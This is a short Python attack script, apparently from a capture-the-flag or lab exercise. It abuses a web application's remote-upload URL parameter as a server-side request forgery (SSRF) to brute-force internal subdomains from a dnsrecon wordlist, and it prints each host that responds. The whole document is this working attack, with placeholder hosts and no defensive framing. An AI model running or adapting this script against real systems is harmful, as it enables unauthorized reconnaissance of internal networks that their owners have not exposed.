from pwn import *
import requests
import json

url = 'http://example.url/'
wordlist = open('/usr/share/dnsrecon/subdomains-top1mil-5000.txt', 'r')

for count, subdomain in enumerate(wordlist):
    subdomain = subdomain.strip()

    # HTTP headers and POST data
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'url': 'http://' + subdomain + '.EXAMPLE.url/',
            'remote': '1'}

    # Send the request and grab response
    try:
        # Timeout after 1 second (if subdomain cant be reached)
        response = requests.post(url + 'upload', data=data, headers=headers, timeout=1)
        print('http://' + subdomain + '.example.url')
    except BaseException:
        pass

    # Track progress / performance
    if((count + 1) % 100 == 0):
        print(str(count + 1) + " attempts so far..")

wordlist.close()
